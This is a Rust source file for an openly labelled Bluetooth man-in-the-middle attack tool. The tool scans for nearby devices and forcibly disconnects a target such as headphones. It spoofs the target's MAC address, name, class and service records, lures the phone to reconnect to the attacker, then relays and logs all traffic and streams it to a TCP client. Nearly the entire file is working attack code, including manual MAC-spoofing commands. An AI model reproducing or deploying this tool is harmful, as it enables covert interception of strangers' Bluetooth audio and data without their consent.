mod config;
mod crypto;
mod tcp_server;
mod bt_utils;

use std::io::{self, BufRead, Write};
use std::net::TcpListener;
use std::os::unix::io::AsRawFd;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;

use libc::c_int;

use bt_utils::BtDevice;
use config::MAX_BUFFER_SIZE;

// ── Signal handling ──────────────────────────────────────────────────────────

static RUNNING: AtomicBool = AtomicBool::new(true);

extern "C" fn signal_handler(sig: c_int) {
    // async-signal-safe: only atomic store
    RUNNING.store(false, Ordering::SeqCst);
    let _ = sig; // suppress unused warning
}

// ── Display helpers ──────────────────────────────────────────────────────────

fn print_usage(prog: &str) {
    eprintln!("Bluetooth MITM Interceptor - Pure Man-in-the-Middle Attack\n");
    eprintln!("Usage: {} [OPTIONS]\n", prog);
    eprintln!("Options:");
    eprintln!("  -t <target_mac>    Target device MAC (headphones/BT device)");
    eprintln!("  -p <psm>           L2CAP PSM (default: 25 for A2DP audio)");
    eprintln!("  -P <port>          TCP server port (default: {})", config::TCP_SERVER_PORT);
    eprintln!("  -S                 Interactive mode - scan and select devices");
    eprintln!("  -h                 Show this help");
    eprintln!();
    eprintln!("Pure MITM Attack Flow:");
    eprintln!("  1. Scan for active Bluetooth connections in the area");
    eprintln!("  2. Force disconnect phone from target device");
    eprintln!("  3. Spoof target device MAC address");
    eprintln!("  4. Accept connection from phone (pretending to be target)");
    eprintln!("  5. Connect to real target device (pretending to be phone)");
    eprintln!("  6. Log all packets flowing between them");
    eprintln!();
    eprintln!("Example:");
    eprintln!("  {}  -S                      # Interactive mode (recommended)", prog);
    eprintln!("  {} -t AA:BB:CC:DD:EE:FF    # Direct target MAC", prog);
    eprintln!();
    eprintln!("Note: This is a pure MITM attack. NO pairing with target required!");
    eprintln!("      The MITM computer acts as a transparent relay.");
}

fn display_devices(devices: &[BtDevice]) {
    println!();
    println!("═══════════════════════════════════════════════════════════════════════════");
    println!("  #  │  MAC Address       │  Status      │  Device Name");
    println!("═══════════════════════════════════════════════════════════════════════════");
    for (i, d) in devices.iter().enumerate() {
        let status = if d.connected { "CONNECTED  " } else { "Paired     " };
        println!(" {:2}  │  {}  │  {} │  {}", i + 1, d.addr, status, d.name);
    }
    println!("═══════════════════════════════════════════════════════════════════════════");
    println!("These devices are paired with this computer.");
    println!("CONNECTED devices will be disconnected during MITM setup.");
    println!("═══════════════════════════════════════════════════════════════════════════");
    println!();
}

fn select_device(devices: &[BtDevice], prompt: &str) -> Option<String> {
    let stdin = io::stdin();
    loop {
        print!("{} (1-{}): ", prompt, devices.len());
        io::stdout().flush().unwrap();
        let mut line = String::new();
        if stdin.lock().read_line(&mut line).is_err() {
            return None;
        }
        match line.trim().parse::<usize>() {
            Ok(n) if n >= 1 && n <= devices.len() => return Some(devices[n - 1].addr.clone()),
            _ => println!("Invalid choice. Please select a number between 1 and {}.", devices.len()),
        }
    }
}

/// Interactive device selection with live scanning.
///
/// Starts a `LiveScanner` in the background, refreshes the device table
/// whenever new devices are discovered, and waits for the user to type a
/// number.  Pressing Enter without a number forces an immediate redisplay.
fn select_device_live(prompt: &str) -> Option<String> {
    info_print!("Starting live Bluetooth scan — devices will appear as they are discovered.");
    info_print!("Press Enter at any time to refresh the list.");
    println!();

    let scanner = bt_utils::LiveScanner::start();

    // Give the initial poll a moment to complete before showing anything.
    std::thread::sleep(std::time::Duration::from_millis(800));

    // Spawn a thread to read stdin without blocking the display loop.
    let (tx, rx) = mpsc::channel::<String>();
    std::thread::spawn(move || {
        let stdin = io::stdin();
        loop {
            let mut line = String::new();
            match stdin.lock().read_line(&mut line) {
                Ok(0) | Err(_) => break, // EOF or error
                Ok(_) => {
                    if tx.send(line.trim().to_string()).is_err() {
                        break;
                    }
                }
            }
        }
    });

    let mut last_count = usize::MAX; // force first display
    let mut last_refresh = std::time::Instant::now();

    loop {
        let devices = scanner.devices.lock().unwrap().clone();
        let count = devices.len();

        // Redisplay when device count changes or after 5 s idle.
        let needs_redisplay = count != last_count
            || last_refresh.elapsed() >= std::time::Duration::from_secs(5);

        if needs_redisplay {
            if last_count != usize::MAX && count != last_count {
                println!("\n[INFO] Device list updated — {} device(s) found", count);
            }
            display_devices(&devices);
            last_count = count;
            last_refresh = std::time::Instant::now();
            if count > 0 {
                print!("{} (1-{}): ", prompt, count);
            } else {
                print!("Scanning… press Enter to check: ");
            }
            io::stdout().flush().unwrap();
        }

        match rx.try_recv() {
            Ok(input) => {
                if input.is_empty() {
                    // Force immediate redisplay on bare Enter.
                    last_count = usize::MAX;
                    continue;
                }
                let devices = scanner.devices.lock().unwrap().clone();
                if devices.is_empty() {
                    println!("No devices found yet — still scanning.");
                    print!("Press Enter to check again: ");
                    io::stdout().flush().unwrap();
                    continue;
                }
                match input.parse::<usize>() {
                    Ok(n) if n >= 1 && n <= devices.len() => {
                        return Some(devices[n - 1].addr.clone());
                    }
                    _ => {
                        println!("Invalid choice. Please select 1–{}.", devices.len());
                        print!("{} (1-{}): ", prompt, devices.len());
                        io::stdout().flush().unwrap();
                    }
                }
            }
            Err(mpsc::TryRecvError::Empty) => {}
            Err(mpsc::TryRecvError::Disconnected) => return None,
        }

        std::thread::sleep(std::time::Duration::from_millis(200));
    }
}

// ── Relay loop ───────────────────────────────────────────────────────────────

fn relay_loop(
    phone_sock: c_int,
    headset_sock: c_int,
    tcp_listener: &TcpListener,
) -> Result<(), String> {
    info_print!("Entering relay loop...");

    // Set the TCP listener to non-blocking so select() + accept() works cleanly.
    tcp_listener.set_nonblocking(true).map_err(|e| e.to_string())?;

    let tcp_server_fd = tcp_listener.as_raw_fd();
    let mut tcp_client: Option<std::net::TcpStream> = None;
    let mut buffer = vec![0u8; MAX_BUFFER_SIZE];

    while RUNNING.load(Ordering::SeqCst) {
        let mut read_fds: libc::fd_set = unsafe { std::mem::zeroed() };
        unsafe {
            libc::FD_ZERO(&mut read_fds);
            libc::FD_SET(phone_sock, &mut read_fds);
            libc::FD_SET(headset_sock, &mut read_fds);
        }
        let mut max_fd = phone_sock.max(headset_sock);

        if tcp_client.is_none() {
            unsafe { libc::FD_SET(tcp_server_fd, &mut read_fds) };
            if tcp_server_fd > max_fd {
                max_fd = tcp_server_fd;
            }
        }

        let mut timeout = libc::timeval { tv_sec: 1, tv_usec: 0 };
        let ret = unsafe {
            libc::select(
                max_fd + 1,
                &mut read_fds,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut timeout,
            )
        };

        if ret < 0 {
            let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
            if errno == libc::EINTR {
                continue;
            }
            error_print!("select() failed: {}", std::io::Error::last_os_error());
            return Err("select() failed".to_string());
        }
        if ret == 0 {
            continue;
        }

        // Accept incoming TCP streaming client.
        if tcp_client.is_none() && unsafe { libc::FD_ISSET(tcp_server_fd, &read_fds) } {
            if let Some(stream) = tcp_server::accept_client(tcp_listener) {
                info_print!("Streaming client connected");
                tcp_client = Some(stream);
            }
            continue;
        }

        // Phone → MITM → Target
        if unsafe { libc::FD_ISSET(phone_sock, &read_fds) } {
            let bytes =
                unsafe { libc::recv(phone_sock, buffer.as_mut_ptr() as *mut libc::c_void, buffer.len(), 0) };

            if bytes == 0 {
                info_print!("Phone disconnected");
                return Err("Phone disconnected".to_string());
            }
            if bytes < 0 {
                error_print!("Error reading from phone");
                return Err("Read error from phone".to_string());
            }
            let n = bytes as usize;

            info_print!("📱 PHONE → TARGET: {} bytes", n);
            print!("[PACKET] ");
            let show = n.min(64);
            for b in &buffer[..show] {
                print!("{:02x} ", b);
            }
            if n > 64 {
                print!("... ({} more bytes)", n - 64);
            }
            println!("\n");

            // Stream to TCP client if one is connected.
            if let Some(ref mut client) = tcp_client {
                if tcp_server::send_data(client, &buffer[..n]).is_err() {
                    info_print!("TCP client disconnected");
                    tcp_client = None;
                }
            }

            // Forward to headset (no decryption/re-encryption – same as C stub).
            let sent = unsafe {
                libc::send(headset_sock, buffer.as_ptr() as *const libc::c_void, n, 0)
            };
            if sent < 0 {
                error_print!("Failed to send to target device");
                return Err("Send error to target".to_string());
            }
        }

        // Target → MITM → Phone
        if unsafe { libc::FD_ISSET(headset_sock, &read_fds) } {
            let bytes = unsafe {
                libc::recv(headset_sock, buffer.as_mut_ptr() as *mut libc::c_void, buffer.len(), 0)
            };

            if bytes == 0 {
                info_print!("Target device disconnected");
                return Err("Target disconnected".to_string());
            }
            if bytes < 0 {
                error_print!("Error reading from target device");
                return Err("Read error from target".to_string());
            }
            let n = bytes as usize;

            info_print!("🎧 TARGET → PHONE: {} bytes", n);
            print!("[PACKET] ");
            let show = n.min(64);
            for b in &buffer[..show] {
                print!("{:02x} ", b);
            }
            if n > 64 {
                print!("... ({} more bytes)", n - 64);
            }
            println!("\n");

            let sent = unsafe {
                libc::send(phone_sock, buffer.as_ptr() as *const libc::c_void, n, 0)
            };
            if sent < 0 {
                error_print!("Failed to send to phone");
                return Err("Send error to phone".to_string());
            }
        }
    }

    Ok(())
}

// ── main ─────────────────────────────────────────────────────────────────────

fn main() {
    // Register signal handlers.
    unsafe {
        libc::signal(libc::SIGINT, signal_handler as *const () as libc::sighandler_t);
        libc::signal(libc::SIGTERM, signal_handler as *const () as libc::sighandler_t);
    }

    let args: Vec<String> = std::env::args().collect();
    let prog = &args[0];

    let mut target_mac: Option<String> = None;
    let mut psm: u16 = 25;
    let mut tcp_port: u16 = config::TCP_SERVER_PORT;
    let mut scan_mode = false;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-t" => {
                i += 1;
                target_mac = args.get(i).cloned();
            }
            "-p" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    psm = v.parse().unwrap_or(25);
                }
            }
            "-P" => {
                i += 1;
                if let Some(v) = args.get(i) {
                    tcp_port = v.parse().unwrap_or(config::TCP_SERVER_PORT);
                }
            }
            "-S" => scan_mode = true,
            "-h" => {
                print_usage(prog);
                std::process::exit(0);
            }
            _ => {
                print_usage(prog);
                std::process::exit(1);
            }
        }
        i += 1;
    }

    // ── Interactive / scan mode ──────────────────────────────────────────────
    if target_mac.is_none() || scan_mode {
        info_print!("═══════════════════════════════════════════════════════");
        info_print!("   Bluetooth MITM Interceptor - Discovery Mode");
        info_print!("═══════════════════════════════════════════════════════");
        info_print!("");
        info_print!("This tool will:");
        info_print!("  1. Scan for active Bluetooth connections");
        info_print!("  2. Force disconnect the target device");
        info_print!("  3. Spoof target's MAC and intercept reconnection");
        info_print!("  4. Act as MITM and log all packets");
        info_print!("");
        info_print!("═══════════════════════════════════════════════════════");
        println!();

        if target_mac.is_none() {
            // Live interactive selection: scan runs in the background and the
            // device table is refreshed automatically as new devices appear.
            info_print!("Select the TARGET device to intercept (usually headphones):");
            info_print!("This is the device the phone is connected to.");
            println!();

            match select_device_live("Select target device") {
                Some(mac) => target_mac = Some(mac),
                None => {
                    error_print!("No device selected");
                    std::process::exit(1);
                }
            }
        } else {
            // -S flag with -t already given: just show a snapshot of nearby devices.
            info_print!("Scanning for Bluetooth devices and active connections...");
            println!();

            let devices = bt_utils::bt_scan_active_connections(50);
            if devices.is_empty() {
                error_print!("No Bluetooth devices found in the area");
                info_print!("");
                info_print!("Make sure:");
                info_print!("  - Target devices (phone + headphones) are nearby");
                info_print!("  - They are currently connected to each other");
                info_print!("  - Bluetooth adapter is powered on");
                std::process::exit(1);
            }
            display_devices(&devices);
        }

        info_print!("✓ Target device selected: {}", target_mac.as_deref().unwrap_or("?"));
        println!();
    }

    let target_mac = match target_mac {
        Some(m) => m,
        None => {
            error_print!("Target MAC address is required");
            print_usage(prog);
            std::process::exit(1);
        }
    };

    // ── Active MITM mode ─────────────────────────────────────────────────────
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("   Bluetooth MITM Attack - Active Mode");
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("Target device:  {}", target_mac);
    info_print!("L2CAP PSM:      {}", psm);
    info_print!("TCP Port:       {}", tcp_port);
    info_print!("═══════════════════════════════════════════════════════");
    println!();

    let adapter_mac = match bt_utils::bt_get_adapter_address() {
        Ok(m) => m,
        Err(_) => std::process::exit(1),
    };
    info_print!("MITM adapter MAC: {}", adapter_mac);
    println!();

    info_print!("MITM Attack Sequence Starting...");
    println!();

    // Step 1 – force disconnect target
    info_print!("Step 1: Force disconnect target device from current connection");
    let target_connected = bt_utils::bt_check_connection_status(&target_mac);

    if target_connected {
        info_print!("⚠️  Target device is CONNECTED - forcing disconnect");
        if bt_utils::bt_disconnect_device(&target_mac).is_err() {
            warn_print!("Standard disconnect failed, trying aggressive methods...");
            let cmd = format!("hcitool dc {} 2>&1", target_mac);
            std::process::Command::new("sh").arg("-c").arg(&cmd).status().ok();
            std::thread::sleep(std::time::Duration::from_secs(1));
        }

        std::thread::sleep(std::time::Duration::from_secs(2));
        if bt_utils::bt_check_connection_status(&target_mac) {
            error_print!("Could not disconnect target device");
            info_print!("");
            info_print!("Please manually disconnect:");
            info_print!("  - Turn off target device, OR");
            info_print!("  - Disconnect from phone's Bluetooth settings");
            info_print!("");
            info_print!("Press Enter when disconnected...");
            let mut s = String::new();
            io::stdin().lock().read_line(&mut s).ok();
        } else {
            info_print!("✓ Target device disconnected");
        }
    } else {
        info_print!("✓ Target device is already disconnected");
    }
    println!();

    // Step 1b – collect target identity (name, CoD, SDP) before we touch the adapter.
    // sdptool browse requires the original adapter MAC to reach the target device.
    info_print!("Collecting target device identity (name, class, SDP records)...");
    let target_info = bt_utils::bt_get_device_info(&target_mac);
    info_print!("  Name : {}", if target_info.name.is_empty() { "[unknown]" } else { &target_info.name });
    info_print!("  CoD  : {}", target_info.cod.as_deref().unwrap_or("[unknown]"));
    bt_utils::bt_clone_sdp_records(&target_mac).ok();
    println!();

    // Step 2 – spoof MAC
    info_print!("Step 2: Spoof target device MAC address");
    info_print!("Changing MITM adapter MAC to: {}", target_mac);
    if bt_utils::bt_spoof_mac_address(0, &target_mac).is_err() {
        error_print!("MAC spoofing failed");
        info_print!("");
        info_print!("Manual MAC spoofing required:");
        info_print!("  sudo hciconfig hci0 down");
        info_print!("  sudo bdaddr -i hci0 {}", target_mac);
        info_print!("  sudo hciconfig hci0 up");
        info_print!("");
        info_print!("Press Enter when MAC is spoofed...");
        let mut s = String::new();
        io::stdin().lock().read_line(&mut s).ok();
    } else {
        info_print!("✓ MAC address spoofed successfully");
        std::thread::sleep(std::time::Duration::from_secs(1));
    }

    // Step 2b – clone device name and Class-of-Device onto the adapter.
    if !target_info.name.is_empty() {
        if bt_utils::bt_set_device_name(0, &target_info.name).is_err() {
            warn_print!("Could not set device name (non-fatal)");
        }
    }
    if let Some(ref cod) = target_info.cod {
        if bt_utils::bt_set_class(0, cod).is_err() {
            warn_print!("Could not set Class-of-Device (non-fatal)");
        }
    }
    std::thread::sleep(std::time::Duration::from_secs(1));
    println!();

    // Step 3 – make discoverable
    info_print!("Step 3: Make MITM adapter discoverable as target device");
    std::process::Command::new("hciconfig").args(["hci0", "piscan"]).status().ok();
    std::process::Command::new("sh")
        .args(["-c", "bluetoothctl discoverable on > /dev/null 2>&1 &"])
        .status().ok();
    info_print!("✓ MITM adapter is now discoverable as {} (\"{}\")",
        target_mac,
        if target_info.name.is_empty() { &target_mac } else { &target_info.name }
    );
    println!();

    // Step 4 – TCP server
    info_print!("Step 4: Create TCP server for data streaming");
    let tcp_listener: TcpListener = match tcp_server::create_server(tcp_port) {
        Ok(l) => l,
        Err(_) => std::process::exit(1),
    };
    info_print!("✓ TCP server listening on port {}", tcp_port);
    println!();

    // Step 5 – L2CAP listen for phone
    info_print!("Step 5: Setup Bluetooth relay - Wait for phone to connect");
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("   MITM READY - Waiting for connections");
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("");
    info_print!("The MITM is now pretending to be: {}", target_mac);
    info_print!("");
    info_print!("Next steps:");
    info_print!("  1. Phone will try to reconnect automatically, OR");
    info_print!("  2. Manually reconnect from phone's Bluetooth settings");
    info_print!("  3. Phone connects to MITM (thinks it's the headphones)");
    info_print!("  4. MITM will then connect to real headphones");
    info_print!("  5. All packets will be logged below");
    info_print!("");
    info_print!("═══════════════════════════════════════════════════════");
    println!();

    let phone_listener = match bt_utils::bt_create_l2cap_socket() {
        Ok(s) => s,
        Err(_) => std::process::exit(1),
    };

    info_print!("Binding to L2CAP PSM {} as spoofed device...", psm);
    if bt_utils::bt_bind_l2cap(phone_listener, None, psm).is_err() {
        unsafe { libc::close(phone_listener) };
        std::process::exit(1);
    }
    if bt_utils::bt_listen_l2cap(phone_listener).is_err() {
        unsafe { libc::close(phone_listener) };
        std::process::exit(1);
    }

    // Set 60-second accept timeout via SO_RCVTIMEO
    let tv = libc::timeval { tv_sec: 60, tv_usec: 0 };
    unsafe {
        libc::setsockopt(
            phone_listener,
            libc::SOL_SOCKET,
            libc::SO_RCVTIMEO,
            &tv as *const libc::timeval as *const libc::c_void,
            std::mem::size_of::<libc::timeval>() as libc::socklen_t,
        );
    }

    info_print!("✓ Listening for incoming connection from phone...");
    info_print!("Waiting for phone to connect (timeout: 60 seconds)...");
    println!();

    let (phone_conn, phone_addr) = match bt_utils::bt_accept_l2cap(phone_listener) {
        Ok(r) => r,
        Err(_) => {
            error_print!("Phone did not connect within timeout");
            info_print!("Make sure phone is trying to connect to the headphones");
            unsafe { libc::close(phone_listener) };
            std::process::exit(1);
        }
    };

    info_print!("✓✓✓ PHONE CONNECTED ✓✓✓");
    info_print!("Source device (phone): {}", phone_addr);
    println!();

    // Step 6 – restore MAC, connect to real headset
    info_print!("Step 6: Connect to real target device (headphones)");
    info_print!("Restoring original adapter MAC: {}", adapter_mac);
    bt_utils::bt_spoof_mac_address(0, &adapter_mac).ok();
    std::thread::sleep(std::time::Duration::from_secs(1));

    info_print!("Connecting to real target device: {}", target_mac);
    let headset_sock = match bt_utils::bt_create_l2cap_socket() {
        Ok(s) => s,
        Err(_) => {
            unsafe { libc::close(phone_conn); libc::close(phone_listener) };
            std::process::exit(1);
        }
    };

    if bt_utils::bt_connect_l2cap(headset_sock, &target_mac, psm).is_err() {
        error_print!("Failed to connect to real target device");
        error_print!("Make sure target device is powered on and in range");
        unsafe {
            libc::close(headset_sock);
            libc::close(phone_conn);
            libc::close(phone_listener);
        }
        std::process::exit(1);
    }

    info_print!("✓✓✓ CONNECTED TO REAL DEVICE ✓✓✓");
    info_print!("");
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("   MITM ACTIVE - Logging all packets");
    info_print!("═══════════════════════════════════════════════════════");
    info_print!("Phone ({}) → MITM → Target ({})", phone_addr, target_mac);
    info_print!("═══════════════════════════════════════════════════════");
    println!();

    relay_loop(phone_conn, headset_sock, &tcp_listener).ok();

    info_print!("Cleaning up...");
    unsafe {
        libc::close(headset_sock);
        libc::close(phone_conn);
        libc::close(phone_listener);
    }
    // tcp_listener is dropped here, closing the TCP server socket.

    info_print!("Shutdown complete");
}
